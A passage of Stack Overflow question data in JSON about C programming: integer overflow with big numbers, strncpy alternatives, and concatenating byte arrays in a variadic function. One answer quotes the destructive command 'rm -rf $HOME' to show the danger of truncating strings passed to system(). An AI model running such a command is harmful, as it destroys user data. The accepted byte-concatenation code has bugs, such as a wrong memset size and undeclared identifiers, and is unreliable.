"user_type": "registered", "profile_image": "https://graph.facebook.com/100001030341259/picture?type=large", "display_name": "Auguste", "link": "https://stackoverflow.com/users/3471712/auguste"}, "edited": false, "score": 0, "creation_date": 1461786445, "post_id": 36899417, "comment_id": 61363165, "body": "Could we see the code you use to create your calculator?:)"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 2, "creation_date": 1461786742, "post_id": 36899417, "comment_id": 61363346, "body": "Both those numbers and their sum fit <code>int64_t</code>."}, {"owner": {"reputation": 29251, "user_id": 3923896, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4139ee1298ce4b0690a788cb97d47569?s=128&d=identicon&r=PG&f=1", "display_name": "Steve Summit", "link": "https://stackoverflow.com/users/3923896/steve-summit"}, "edited": false, "score": 2, "creation_date": 1461787272, "post_id": 36899417, "comment_id": 61363691, "body": "Possible duplicate of <a href=\"http://stackoverflow.com/questions/3290173/how-to-work-with-big-numbers\">How to work with BIG numbers?</a>"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1461787283, "post_id": 36899417, "comment_id": 61363699, "body": "May I suggest your program also prints the supposed value of the two operands? Errors can happen on the first step."}], "answers": [{"tags": [], "owner": {"reputation": 3913, "user_id": 342384, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/MRRvI.jpg?s=128&g=1", "display_name": "iksemyonov", "link": "https://stackoverflow.com/users/342384/iksemyonov"}, "is_accepted": false, "score": 1, "last_activity_date": 1461786926, "last_edit_date": 1461786926, "creation_date": 1461786570, "answer_id": 36899568, "question_id": 36899417, "link": "https://stackoverflow.com/questions/36899417/calculating-with-very-big-numbers/36899568#36899568", "title": "Calculating With Very Big Numbers", "body": "<p>Simply put, the built-in numeric data types that you're using within C and C++, such as <code>float</code>, <code>int</code>, etc., are limited due to them being represented with a finite and fixed amount of bits, such as 32, 64, etc. bits. You can't \"stuff\" more information into 32 bits than you can, that's the theory of information (read up). Now, when you add two \"very big\" numbers, due to the machine representation, a so-called \"overflow\" occurs (read up), which means that a bit sequence is being created as a result of the operation that represents a \"meaningless\" number; and if the data type is signed, a negative number is likely to appear (again, due to the internal representation).</p>\n\n<p>Now your calculators use so-called \"big numbers arithmetic\", or \"long numbers arithmetic\", implemented in the corresponding libraries. With this approach, the number is represented as an array of numbers, and is thus virtually unlimited (of course, there are limits to the length of an array too, but the range that you can represent this way is a lot wider than that of the built-in types.)</p>\n\n<p>To sum up, read on:</p>\n\n<ul>\n<li>theory of information</li>\n<li>binary number system and conversions decimal &lt;-> binary</li>\n<li>binary arithmetics with signed numbers</li>\n<li>big number arithmetics</li>\n</ul>\n"}, {"tags": [], "owner": {"reputation": 669, "user_id": 6253379, "user_type": "registered", "accept_rate": 43, "profile_image": "https://i.stack.imgur.com/VDrH9.png?s=128&g=1", "display_name": "Nikos Kazazakis", "link": "https://stackoverflow.com/users/6253379/nikos-kazazakis"}, "is_accepted": false, "score": 2, "last_activity_date": 1461786622, "creation_date": 1461786622, "answer_id": 36899588, "question_id": 36899417, "link": "https://stackoverflow.com/questions/36899417/calculating-with-very-big-numbers/36899588#36899588", "title": "Calculating With Very Big Numbers", "body": "<p>Digital data is represented as binary information. So, for an 8-bit integer you would have: <code>0=00000000, 1=00000001, 2=00000010, 3=00000011,</code> etc. As you can imagine, the larger the numbers grow, the more storage is required to represent this information in binary form. What happens with your calculator is called overflow, where the resulting number is simply too large to represent in binary form (there are not enough bits to hold the information).</p>\n\n<p>Now as to why you get accurate results in your computer, it depends on how their software is implemented. Possible explanations are that they either use higher precision arithmetic (they dedicate more bits) the use m<a href=\"https://en.wikipedia.org/wiki/Arbitrary-precision_arithmetic\" rel=\"nofollow\">ultiple precision arithmetic</a>, or perform floating point calculations internally. My money would be on multiple precision arithmetic though.</p>\n"}, {"comments": [{"owner": {"reputation": 52656, "user_id": 225074, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/dea26ac1ef8259140d28aa8b5ba4f1b3?s=128&d=identicon&r=PG", "display_name": "Thomas Matthews", "link": "https://stackoverflow.com/users/225074/thomas-matthews"}, "edited": false, "score": 0, "creation_date": 1461790556, "post_id": 36899725, "comment_id": 61365596, "body": "Also try the synonym &quot;c++ Big Number library&quot;. :-)"}], "tags": [], "owner": {"reputation": 29251, "user_id": 3923896, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4139ee1298ce4b0690a788cb97d47569?s=128&d=identicon&r=PG&f=1", "display_name": "Steve Summit", "link": "https://stackoverflow.com/users/3923896/steve-summit"}, "is_accepted": false, "score": 1, "last_activity_date": 1461787105, "creation_date": 1461787105, "answer_id": 36899725, "question_id": 36899417, "link": "https://stackoverflow.com/questions/36899417/calculating-with-very-big-numbers/36899725#36899725", "title": "Calculating With Very Big Numbers", "body": "<p>Short answer (and I'm not sure why you didn't find it, because it's been asked many, many times): you want a multiple-precision arithmetic library, such as GMP.</p>\n"}], "owner": {"reputation": 1, "user_id": 6263359, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-IW1GMgmlWpo/AAAAAAAAAAI/AAAAAAAAAEQ/JH-1nHnqHWw/photo.jpg?sz=128", "display_name": "arda g&#252;ler", "link": "https://stackoverflow.com/users/6263359/arda-g%c3%bcler"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 312, "favorite_count": 0, "closed_date": 1461787336, "answer_count": 3, "score": -5, "last_activity_date": 1461787105, "creation_date": 1461786001, "question_id": 36899417, "link": "https://stackoverflow.com/questions/36899417/calculating-with-very-big-numbers", "closed_reason": "Not suitable for this site", "title": "Calculating With Very Big Numbers", "body": "<p>I'm -kind of- a beginner to C.</p>\n\n<p>I made several searches but I haven't seen this question asked.\nWhen I try to calculate very big numbers (let's say... Adding 45235432412321312 to 5495034095872309238) my calculator gives answers which are not true. (The answer of my calculator was -2 for the numbers I've given in the previous sentence). </p>\n\n<p>But both Linux's and Windows's own calculators calculate these numbers precisely.</p>\n\n<p>What causes my calculator written in C/C++ to give these wrong answers with big numbers? What can I do to calculate these?</p>\n"}, {"tags": ["c", "strncpy"], "comments": [{"owner": {"reputation": 5865, "user_id": 5298696, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-_Lk3Kq_mN2c/AAAAAAAAAAI/AAAAAAAAAEQ/4UXPTXc6z6U/photo.jpg?sz=128", "display_name": "CollinD", "link": "https://stackoverflow.com/users/5298696/collind"}, "edited": false, "score": 1, "creation_date": 1461786007, "post_id": 36899359, "comment_id": 61362891, "body": "What is this accomplishing that <code>strcopy</code> doesn&#39;t already provide? Additionally why do you need to know the length of a null-terminated <code>char *source</code> to copy it?"}, {"owner": {"user_type": "does_not_exist", "display_name": "user5940189"}, "reply_to_user": {"reputation": 5865, "user_id": 5298696, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-_Lk3Kq_mN2c/AAAAAAAAAAI/AAAAAAAAAEQ/4UXPTXc6z6U/photo.jpg?sz=128", "display_name": "CollinD", "link": "https://stackoverflow.com/users/5298696/collind"}, "edited": false, "score": 0, "creation_date": 1461786245, "post_id": 36899359, "comment_id": 61363037, "body": "It has buffer-overflow protection for the dest. i.e I&#39;ll be using &#39;elements&#39; to pass the max destination length."}, {"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1461786290, "post_id": 36899359, "comment_id": 61363066, "body": "BTW: <code>dest[run+1]=&#39;\\0&#39;;</code> --&gt;&gt; <code>dest[run]=&#39;\\0&#39;;</code> (run is already incremented after the loop)"}, {"owner": {"reputation": 290304, "user_id": 187690, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/89a4da7af5bf1558b7d2704309f1f118?s=128&d=identicon&r=PG", "display_name": "AnT", "link": "https://stackoverflow.com/users/187690/ant"}, "edited": false, "score": 0, "creation_date": 1461786294, "post_id": 36899359, "comment_id": 61363068, "body": "The first function is simply broken, since it unconditionally copies <code>elements-1</code> chars ignoring the fact that <code>source</code> can end well before that."}, {"owner": {"reputation": 5865, "user_id": 5298696, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-_Lk3Kq_mN2c/AAAAAAAAAAI/AAAAAAAAAEQ/4UXPTXc6z6U/photo.jpg?sz=128", "display_name": "CollinD", "link": "https://stackoverflow.com/users/5298696/collind"}, "edited": false, "score": 0, "creation_date": 1461786331, "post_id": 36899359, "comment_id": 61363092, "body": "@Orangesandlemons Then it sounds like you&#39;re reimplementing <code>strncpy</code> rather than <code>strcpy</code> as you stated."}, {"owner": {"reputation": 228853, "user_id": 827263, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/216c1db53d752f87dd8176a6ba0c2190?s=128&d=identicon&r=PG", "display_name": "Keith Thompson", "link": "https://stackoverflow.com/users/827263/keith-thompson"}, "reply_to_user": {"reputation": 5865, "user_id": 5298696, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-_Lk3Kq_mN2c/AAAAAAAAAAI/AAAAAAAAAEQ/4UXPTXc6z6U/photo.jpg?sz=128", "display_name": "CollinD", "link": "https://stackoverflow.com/users/5298696/collind"}, "edited": false, "score": 0, "creation_date": 1461786364, "post_id": 36899359, "comment_id": 61363112, "body": "@CollinD: The spelling is <code>strncpy</code> and <code>strcpy</code>, not <code>strncopy</code> and <code>strcopy</code>."}, {"owner": {"reputation": 5865, "user_id": 5298696, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-_Lk3Kq_mN2c/AAAAAAAAAAI/AAAAAAAAAEQ/4UXPTXc6z6U/photo.jpg?sz=128", "display_name": "CollinD", "link": "https://stackoverflow.com/users/5298696/collind"}, "reply_to_user": {"reputation": 228853, "user_id": 827263, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/216c1db53d752f87dd8176a6ba0c2190?s=128&d=identicon&r=PG", "display_name": "Keith Thompson", "link": "https://stackoverflow.com/users/827263/keith-thompson"}, "edited": false, "score": 1, "creation_date": 1461786388, "post_id": 36899359, "comment_id": 61363127, "body": "@KeithThompson ah absolutely, typing too quickly for my own good. <code>s&#47;copy&#47;cpy&#47;g</code> pls. <code>#define strcopy strcpy</code> <code>#define strncopy strncpy</code>"}, {"owner": {"user_type": "does_not_exist", "display_name": "user5940189"}, "reply_to_user": {"reputation": 290304, "user_id": 187690, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/89a4da7af5bf1558b7d2704309f1f118?s=128&d=identicon&r=PG", "display_name": "AnT", "link": "https://stackoverflow.com/users/187690/ant"}, "edited": false, "score": 0, "creation_date": 1461786461, "post_id": 36899359, "comment_id": 61363175, "body": "@ant, yes. I&#39;ve overlooked that, and will adapt."}, {"owner": {"reputation": 50126, "user_id": 1717300, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/81b91f602ce8acea8cbeb29f62725627?s=128&d=identicon&r=PG", "display_name": "hyde", "link": "https://stackoverflow.com/users/1717300/hyde"}, "edited": false, "score": 0, "creation_date": 1461786497, "post_id": 36899359, "comment_id": 61363201, "body": "<code>strncpy</code> isn&#39;t really a string function at all, because it might not produce a string (nul-terminated), and that it fills destination with zeroes if there&#39;s room, in that case writing beyond end of string. It is for filling fixed size char arrays, usually struct fields."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1461787314, "post_id": 36899359, "comment_id": 61363715, "body": "Corner case: <code>copystring(char *dest,char *source,int elements)</code> (2nd version) fails dramatically when <code>elements &lt;= 0</code>"}, {"owner": {"user_type": "does_not_exist", "display_name": "user5940189"}, "reply_to_user": {"reputation": 5865, "user_id": 5298696, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-_Lk3Kq_mN2c/AAAAAAAAAAI/AAAAAAAAAEQ/4UXPTXc6z6U/photo.jpg?sz=128", "display_name": "CollinD", "link": "https://stackoverflow.com/users/5298696/collind"}, "edited": false, "score": 0, "creation_date": 1461787333, "post_id": 36899359, "comment_id": 61363724, "body": "@CollinD sorry, it was a typo in- I had it right in the title, and have now corrected it in the body"}, {"owner": {"reputation": 5865, "user_id": 5298696, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-_Lk3Kq_mN2c/AAAAAAAAAAI/AAAAAAAAAEQ/4UXPTXc6z6U/photo.jpg?sz=128", "display_name": "CollinD", "link": "https://stackoverflow.com/users/5298696/collind"}, "edited": false, "score": 0, "creation_date": 1461787362, "post_id": 36899359, "comment_id": 61363742, "body": "@Orangesandlemons Whoops; sorry if I came off overly pedantic. Makes a lot more sense now."}, {"owner": {"user_type": "does_not_exist", "display_name": "user5940189"}, "edited": false, "score": 0, "creation_date": 1461787582, "post_id": 36899359, "comment_id": 61363870, "body": "@chucx yes, but as that would mean I&#39;ve created a destination array of zero elements, as that&#39;s how I plan to use it."}, {"owner": {"user_type": "does_not_exist", "display_name": "user5940189"}, "reply_to_user": {"reputation": 5865, "user_id": 5298696, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-_Lk3Kq_mN2c/AAAAAAAAAAI/AAAAAAAAAEQ/4UXPTXc6z6U/photo.jpg?sz=128", "display_name": "CollinD", "link": "https://stackoverflow.com/users/5298696/collind"}, "edited": false, "score": 0, "creation_date": 1461787613, "post_id": 36899359, "comment_id": 61363893, "body": "@CollinD not at all, and thanks for pointing it out."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1461790003, "post_id": 36899359, "comment_id": 61365272, "body": "@Orangesandlemons To be clear: <code>copystring(dest, source, 0)</code> calls <code>strncpy(dest,source,0-1);</code> which is <code>strncpy(dest,source,some_very_large_number);</code> and not <code>strncpy(dest,source, -1);</code>"}], "answers": [{"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user5940189"}, "edited": false, "score": 0, "creation_date": 1461787108, "post_id": 36899447, "comment_id": 61363590, "body": "My plan is to continue reading the string until the end is reached (but not into an array), and then return that number as the function return, allowing customised error handling depending on need. Of course, if I need all the characers I will have to allocate dynamicly"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1461787113, "post_id": 36899447, "comment_id": 61363593, "body": "Note: important that <code>size</code> does not exceed the size of the space pointed to by <code>dest</code>.  2) BTW: good choice between OP&#39;s 2 options: neither"}, {"owner": {"user_type": "does_not_exist", "display_name": "user5940189"}, "edited": false, "score": 0, "creation_date": 1461787878, "post_id": 36899447, "comment_id": 61364036, "body": "One disadvantage of this is that it  would require initialising dest [0] with &#39;\\0&#39;, while idealy I&#39;d have as little code as possible. I&#39;m still trying to work out a way to dispense of needing to tell my function the size of the destination array in cases where an array has decayed to a pointer etc."}, {"owner": {"reputation": 228853, "user_id": 827263, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/216c1db53d752f87dd8176a6ba0c2190?s=128&d=identicon&r=PG", "display_name": "Keith Thompson", "link": "https://stackoverflow.com/users/827263/keith-thompson"}, "edited": false, "score": 1, "creation_date": 1461788006, "post_id": 36899447, "comment_id": 61364121, "body": "@Orangesandlemons: You <i>can&#39;t</i> avoid telling your function the size of the destination array, unless you&#39;re willing to allow buffer overruns."}, {"owner": {"user_type": "does_not_exist", "display_name": "user5940189"}, "edited": false, "score": 0, "creation_date": 1461788166, "post_id": 36899447, "comment_id": 61364227, "body": "@Keith Thompson I know, but if arrays didn&#39;t decay I&#39;d be able to tell it internally, rather than pass it as an argument, hus making a much &#39;cleaner&#39; function."}], "tags": [], "owner": {"reputation": 228853, "user_id": 827263, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/216c1db53d752f87dd8176a6ba0c2190?s=128&d=identicon&r=PG", "display_name": "Keith Thompson", "link": "https://stackoverflow.com/users/827263/keith-thompson"}, "is_accepted": false, "score": 2, "last_activity_date": 1461788196, "last_edit_date": 1461788196, "creation_date": 1461786121, "answer_id": 36899447, "question_id": 36899359, "link": "https://stackoverflow.com/questions/36899359/strncpy-alternative-what-advatages-to-each-version/36899447#36899447", "title": "strncpy() alternative - what advatages to each version?", "body": "<p>The simplest replacement for <code>strncpy()</code> (if you feel that you need one) is probably this:</p>\n\n<pre><code>dest[0] = '\\0';\nstrncat(dest, source, size);\n</code></pre>\n\n<p><code>strncat()</code>, unlike <code>strncpy()</code>, guarantees that the target is properly null-terminated, and doesn't copy extra null bytes when the target is bigger than the source.</p>\n\n<p>But be sure that this behavior is really what you want. If you use <code>strcpy()</code> and the target array isn't big enough, you get undefined behavior. With <code>strncpy</code> or <code>strncat</code>, you get defined behavior: the value is quietly truncated.  If that's what you want, great -- but it rarely is. More commonly, truncating data just gives you bad data, and you should detect it and handle it as an error rather than Procusteanly discarding whatever won't fit. (Imaging truncating <code>\"rm -rf $HOME/unimportant_directory\"</code> to <code>\"rm -rf $HOME\"</code> before passing it to <code>system()</code>.)</p>\n\n<blockquote>\n  <p>As an aside, why does <code>strncpy()</code> take <code>size_t</code> as the final argument? if\n  it's for passing <code>sizeof</code> values, which will only be useful in very\n  limited circumstances, wouldn't an <code>int</code> do just as well?</p>\n</blockquote>\n\n<p><code>size_t</code> just makes more sense, since it's the type used to represent sizes and lengths. Using <code>int</code> would require defining (or leaving undefined) the behavior for negative arguments, and could limit the size of the string you could handle (if, say, <code>int</code> is 16 bits and <code>size_t</code> is 32 bits). You can always pass an <code>int</code> value, and it will be implicitly converted to <code>size_t</code>.</p>\n\n<p>Another option is the non-standard <a href=\"https://www.freebsd.org/cgi/man.cgi?query=strlcpy&amp;sektion=3\" rel=\"nofollow\"><code>strlcpy()</code></a> function. It's not available on all systems, but you should be able to install it (for example, using the <code>libbsd-dev</code> package for Debian/Ubuntu/... systems) or build it from source.</p>\n\n<p>Incidentally, here's my rant on the topic of <code>strncpy()</code>:<br>\n<a href=\"http://the-flat-trantor-society.blogspot.com/2012/03/no-strncpy-is-not-safer-strcpy.html\" rel=\"nofollow\">http://the-flat-trantor-society.blogspot.com/2012/03/no-strncpy-is-not-safer-strcpy.html</a></p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user5940189"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 408, "favorite_count": 0, "answer_count": 1, "score": 2, "last_activity_date": 1461832486, "creation_date": 1461785814, "last_edit_date": 1461832486, "question_id": 36899359, "link": "https://stackoverflow.com/questions/36899359/strncpy-alternative-what-advatages-to-each-version", "title": "strncpy() alternative - what advatages to each version?", "body": "<p>I was thinking of making a strncpy alternative with terminating '\\0' for my own use in a header file, and am wondering what of the following approaches would be better. </p>\n\n<pre><code>int copystring(char *dest,char *source,int elements)\n{\n    int run;\n    for(run=0;run&lt;elements-1;run++)//last reserved for'\\0'\n    {\n       dest[run]=source [run];\n       if (dest[run]=='\\0')\n       {\n           break;\n       }\n\n    }\n    dest[elements-1]='\\0';//could make conditional but not neccesary.\n    return 0;\n}\n</code></pre>\n\n<p>OR</p>\n\n<pre><code>int copystring(char *dest,char *source,int elements)\n {\n        strncpy(dest,source,elements-1);\n        dest[elements-1]='\\0';\n        return 0;\n  }\n</code></pre>\n\n<p>The obvious difference to me is that I'm calling one less function with version one, but I was wondering if version two has any advantages, as I don't know the internal workings of strncpy()</p>\n\n<p>As an aside, why does strncpy() take size_t as the final argument? if it's for passing sizeof values, which will only be useful in very limited circumstances, wouldn't an int do just as well?</p>\n"}, {"tags": ["c", "arrays", "concat", "variadic-functions"], "comments": [{"owner": {"reputation": 1299, "user_id": 2879288, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/182e7e883318dda71db9b19133237549?s=128&d=identicon&r=PG&f=1", "display_name": "Cyb3rFly3r", "link": "https://stackoverflow.com/users/2879288/cyb3rfly3r"}, "edited": false, "score": 0, "creation_date": 1461785462, "post_id": 36899055, "comment_id": 61362558, "body": "There is a lot more to this than just the variable number of arguments; I think that the main issue you have to think about is memory management. Handling various arguments is the easy part: look at <a href=\"http://stackoverflow.com/questions/205529/passing-variable-number-of-arguments-around\">this question</a> too."}, {"owner": {"reputation": 43, "user_id": 5738586, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ce4b4fb80e908980d5253154602b38b1?s=128&d=identicon&r=PG&f=1", "display_name": "ant", "link": "https://stackoverflow.com/users/5738586/ant"}, "edited": false, "score": 0, "creation_date": 1461785607, "post_id": 36899055, "comment_id": 61362640, "body": "How to get arguments list from fmt in bytesConcat function?"}, {"owner": {"reputation": 24488, "user_id": 4082723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/LJbVr.png?s=128&g=1", "display_name": "2501", "link": "https://stackoverflow.com/users/4082723/2501"}, "edited": false, "score": 0, "creation_date": 1461785749, "post_id": 36899055, "comment_id": 61362735, "body": "@anto By using <code>stdarg.h</code> library. Let us know when you encounter a specific problem using it."}, {"owner": {"reputation": 43, "user_id": 5738586, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ce4b4fb80e908980d5253154602b38b1?s=128&d=identicon&r=PG&f=1", "display_name": "ant", "link": "https://stackoverflow.com/users/5738586/ant"}, "reply_to_user": {"reputation": 24488, "user_id": 4082723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/LJbVr.png?s=128&g=1", "display_name": "2501", "link": "https://stackoverflow.com/users/4082723/2501"}, "edited": false, "score": 0, "creation_date": 1461961351, "post_id": 36899055, "comment_id": 61452202, "body": "@2501, Thank you for point out."}], "answers": [{"comments": [{"owner": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "edited": false, "score": 0, "creation_date": 1461788332, "post_id": 36899406, "comment_id": 61364312, "body": "I am not the down voter here, but what does using dynamic memory allocation have to do with using veriadic functions?  (  <code>bytes bytesConcat(bytes fmt, ...);</code>  )"}, {"owner": {"reputation": 8071, "user_id": 5230735, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/97305d39e366bd0cf7e0e9bf5b19c179?s=128&d=identicon&r=PG&f=1", "display_name": "ralf htp", "link": "https://stackoverflow.com/users/5230735/ralf-htp"}, "reply_to_user": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "edited": false, "score": 0, "creation_date": 1461789609, "post_id": 36899406, "comment_id": 61365048, "body": "i think the resulting array is of variable length, therefore the dynamic memory allocation. Per argument the array grows and it is initially not determined how many arguments will be passed to the function..."}], "tags": [], "owner": {"reputation": 8071, "user_id": 5230735, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/97305d39e366bd0cf7e0e9bf5b19c179?s=128&d=identicon&r=PG&f=1", "display_name": "ralf htp", "link": "https://stackoverflow.com/users/5230735/ralf-htp"}, "is_accepted": false, "score": -2, "last_activity_date": 1461790897, "last_edit_date": 1495540360, "creation_date": 1461785962, "answer_id": 36899406, "question_id": 36899055, "link": "https://stackoverflow.com/questions/36899055/combine-byte-arrays-for-accepting-a-variable-number-of-arguments/36899406#36899406", "title": "Combine byte arrays for accepting a variable number of arguments", "body": "<p>Use dynamic arrays / dynamic memory allocation: <code>malloc()</code> <code>calloc()</code> <code>realloc()</code> <code>free()</code> </p>\n\n<p>At initialization allocate memory for the array using <code>malloc()</code> or <code>calloc()</code>. If the array gets bigger or smaller use <code>realloc()</code> to allocate the new amount of memory</p>\n\n<p>An example is in this: <a href=\"https://stackoverflow.com/questions/12675919/dynamic-array-in-c-is-my-understanding-of-malloc-realloc-correct\">Dynamic Array in C - Is my understanding of malloc/realloc correct?</a></p>\n\n<pre><code>double* data = (double*)malloc(10*sizeof(double));\n\n for (j=0;j&lt;10;j++)\n {`\n      data[j]= ((double)j)/100;\n      printf(\"%g, \",data[j]);\n }\n\n printf(\"\\n\");\n\n data = (double*)realloc(data,11*sizeof(double));\n\n for (j=0;j&lt;11;j++)\n {\n     if (j == 10){ data[j]= ((double)j)/100; }\n     printf(\"%g, \",data[j]);\n }\n\n free((void*) data);\n</code></pre>\n\n<p>See also <a href=\"https://www.happybearsoftware.com/implementing-a-dynamic-array\" rel=\"nofollow noreferrer\">https://www.happybearsoftware.com/implementing-a-dynamic-array</a></p>\n\n<p>Because of the <em>variadic function</em> 2501's comment is correct. Use <code>stdarg.h</code> and see e.g. wikipedia for example (<a href=\"https://en.wikipedia.org/wiki/Variadic_function\" rel=\"nofollow noreferrer\">https://en.wikipedia.org/wiki/Variadic_function</a>)</p>\n\n<p>For concatenating arrays in C see <strong><a href=\"https://stackoverflow.com/questions/1696074/how-can-i-concatenate-two-arrays-in-c\">How can I concatenate two arrays in C?</a></strong></p>\n"}, {"tags": [], "owner": {"reputation": 43, "user_id": 5738586, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ce4b4fb80e908980d5253154602b38b1?s=128&d=identicon&r=PG&f=1", "display_name": "ant", "link": "https://stackoverflow.com/users/5738586/ant"}, "is_accepted": true, "score": 0, "last_activity_date": 1461961818, "creation_date": 1461961818, "answer_id": 36946958, "question_id": 36899055, "link": "https://stackoverflow.com/questions/36899055/combine-byte-arrays-for-accepting-a-variable-number-of-arguments/36946958#36946958", "title": "Combine byte arrays for accepting a variable number of arguments", "body": "<p>@2501, Thank you for point out.</p>\n\n<pre><code>unsigned char *appendBytes(int count, int *size, unsigned char *arg1, ...) {\n    int i, total;\n    unsigned char *tmp, *pd, *argn;\n    va_list ap;\n\n    if ((arg1 != NULL) &amp;&amp; (count &gt; 0)) {\n        total = 0;\n        for (i = 0; i &lt; count; i++) {\n            total += size[i];\n        }\n\n        if (total &gt; 0) {\n            tmp = (unsigned char *)malloc((size_t)(total + 1));\n            if (tmp != NULL) {\n                memset(tmp, null, sizeof(tmp));\n                pd = tmp;\n\n                va_start(ap, arg1);\n                memcpy(pd, arg1, size[0]);\n                pd += size[0];\n                for (i = 1; i &lt; count; i++) {\n                    argn = va_arg(ap, unsigned char*);\n                    memcpy(pd, argn, size[i]);\n                    pd += size[i];\n                }\n                va_end(ap);\n                return tmp;\n            }\n        }\n    }\n    return NULL;\n}\n\nvoid main(){\n    static unsigned char c1[] = { 1};\n    static unsigned char c2[] = { 2, 3 };\n    static unsigned char c3[] = { 4, 5, 6, 7, 8, 9, 10 };\n\n    int size[] = { sizeof(c1), sizeof(c2), sizeof(c3) };\n    unsigned char *result = appendBytes(3, size, c1, c2, c3);\n\n    // show output : 1 2 3 4 5 6 7 8 9 10\n    for (i = 0; i &lt; sizeof(c1) + sizeof(c2)+ sizeof(c3); i++) {\n        printf(\"%u \", result[i]);\n    }\n\n    getchar();\n}\n</code></pre>\n"}], "owner": {"reputation": 43, "user_id": 5738586, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ce4b4fb80e908980d5253154602b38b1?s=128&d=identicon&r=PG&f=1", "display_name": "ant", "link": "https://stackoverflow.com/users/5738586/ant"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 43, "favorite_count": 0, "accepted_answer_id": 36946958, "answer_count": 2, "score": -1, "last_activity_date": 1461965293, "creation_date": 1461784865, "last_edit_date": 1461965293, "question_id": 36899055, "link": "https://stackoverflow.com/questions/36899055/combine-byte-arrays-for-accepting-a-variable-number-of-arguments", "title": "Combine byte arrays for accepting a variable number of arguments", "body": "<p>How to combine byte arrays for accepts a variable number of arguments(variadic function) in c?</p>\n\n<pre><code>typedef struct {\n    unsigned char *data; \n    int length;          \n} bytes;\n\n// Problem in here how to combine byte arrays \n// for accepts a variable number of arguments\nbytes bytesConcat(bytes fmt, ...) {\n    return b1 + b2 + ...b(n)\n}\n\nstatic unsigned char src1[] = { 1,2 }; \nstatic unsigned char src2[] = { 3,4 };\n\nvoid main() {\n    bytes b1, b2;\n\n    b1.data = src1;\n    b1.length = sizeof(src1);\n    b2.data = src2;\n    b2.length = sizeof(src2);\n\n    // call byteConcat with passing two arguments\n    // result1 expected is 1,2,3,4\n    bytes result1 = bytesConcat(b1, b2);\n}\n</code></pre>\n\n<p>Thanks in advance</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": 